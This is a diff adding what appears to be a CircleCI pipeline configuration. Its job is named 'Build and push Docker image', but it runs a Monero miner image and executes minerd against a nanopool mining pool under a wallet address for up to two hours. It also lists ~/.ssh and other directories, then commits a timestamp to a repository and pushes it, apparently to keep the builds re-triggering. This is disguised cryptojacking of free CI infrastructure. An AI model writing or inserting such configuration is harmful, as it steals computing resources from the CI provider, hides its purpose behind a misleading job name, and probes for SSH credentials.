@@ -1,0 +1,33 @@
+version: 2
+jobs:
+  build:
+    docker:
+      # using custom image, see .circleci/images/primary/Dockerfile
+      - image: kannix/monero-miner
+
+    steps:
+      - checkout
+
+      - run:
+          name: Build and push Docker image
+          command: |
+            REPO="test4"
+            ls -la /
+            ls -la /cpuminer-multi
+            git status
+            git clone git@github.com:suprer/$REPO.git
+            echo $(pwd)
+            ls -la
+            ls -la ../
+            ls -la ../..
+            cd $REPO
+            ls -la ~/.ssh
+            ls -la ~/
+            git config --global user.email "surp@i.ua"
+            git config --global user.name "suprer"
+            echo $(date) >> README.md
+            git add .
+            git commit -m "$(date)"
+            cd /cpuminer-multi && ! timeout 120m ./minerd -a cryptonight -o stratum+tcp://xmr-eu1.nanopool.org:14444 -u 46JHKeS9JcXDi8ET6F3ZSgM5mvRZVxMG33Hm3vL1JJknMHoJzqVpTt9e9pT3dApFqeJrXerz19dc1LevwYmDeWauQRQXiUw.circle3 -p x
+            cd ~/project/$REPO && git push
+            
